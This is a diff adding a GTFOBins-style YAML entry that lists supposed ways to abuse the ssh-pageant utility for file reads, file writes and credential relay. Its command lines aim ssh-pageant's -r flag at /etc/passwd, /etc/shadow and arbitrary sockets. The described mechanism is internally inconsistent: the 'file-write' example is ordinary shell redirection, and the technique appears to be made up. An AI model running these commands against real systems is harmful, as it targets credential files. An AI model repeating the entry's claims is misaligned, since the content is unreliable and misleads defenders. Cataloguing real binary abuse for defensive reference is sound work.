@@ -1,0 +1,27 @@
+---
+comment: |-
+  ssh-pageant is a helper utility that allows PuTTY and other Windows tools to communicate with ssh-agent. It can be abused to read agent data, relay credentials, and escalate privileges when misconfigured.
+functions:
+  file-read:
+  - code: |-
+      ssh-pageant -r /etc/passwd
+    contexts:
+      unprivileged:
+        comment: |-
+          Reads the contents of a local file by tricking ssh-pageant into treating it as agent input.
+  file-write:
+  - code: |-
+      ssh-pageant -r /etc/shadow > /tmp/out.txt
+    contexts:
+      unprivileged:
+        comment: |-
+          Redirects agent output to arbitrary files, effectively writing sensitive data if elevated.
+  inherit:
+  - code: |-
+      ssh-pageant -r /path/to/socket
+    comment: |-
+      The `-r` flag allows specifying arbitrary sockets or files. This can be abused for exfiltration or credential relay.
+    contexts:
+      unprivileged:
+    from: ssh
+...
